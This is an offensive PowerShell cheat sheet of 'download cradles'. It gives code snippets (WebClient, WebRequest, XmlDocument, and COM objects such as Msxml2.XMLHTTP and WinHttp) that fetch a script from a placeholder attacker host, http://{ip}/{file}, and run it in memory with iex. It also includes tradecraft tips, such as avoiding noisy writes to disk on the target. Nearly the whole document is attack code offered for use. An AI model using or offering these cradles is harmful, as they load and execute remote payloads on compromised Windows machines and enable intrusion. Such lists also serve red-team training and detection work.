# Powershell Downloading and Execution
Tags:
#powershell #execution #windows #downloader #download

## Net.WebClient DownloadString Method
Most common download cradle. Use with IEX to run remote powershell scripts. 

```
powershell.exe iex (New-Object Net.Webclient).DownloadString('http://{ip}/{file}')
```

or by breaking it up:

```
$downloader = New-Object System.Net.WebClient
$payload = "http://{ip}/{file}"
$command = $downloader.DownloadString($payload)
iex $command
```

## Net.WebClient DownloadFile Method
Noisy and not recommended. Will download file to disk. 

```
$downloader = New.Object System.Net.Webclient
$payload = "http://{ip}/{file}"
$local_file = "C:\programdata\payload.exe"
$downloader.DownloadFile($payload, $local_file)
```

## Net.WebRequest
Used to download and execute scripts on target in memory.

```
$req = [System.Net.WebRequest]::Create("http://{ip}/{file}")
$res = $req.GetResponse()
iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()
```

## System.Xml.XmlDocument
First create a XML file with the following contents: 

```
<?xml version="1.0"?>
<command>
	<a>
		<execute>Get-Process</execute>
	</a>
</command>
```

Next we can use the System.Xml.XmlDocument class with the "Load" method to download and execute: 

```
$xmldoc = New-Object System.Xml.XmlDocument
$xmldoc.Load("http://{ip}/{file}.xml")
iex $xmldoc.command.a.execute
```

## Msxml2.XMLHTTP COM Object 

```
$downloader = New-Object -ComObject Msxml2.XMLHTTP
$downloader.open("GET", "http://{ip}/{file}", $false)
$downloader.send()
iex $downloader.responseText
```

## WinHttp.WinHttpRequest.5.1 COM Object

```
$url=http://{ip}/{file}
$downloader = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$downloader.open("GET", $url, $false)
$downloader.send()
iex $downloader.responseText
```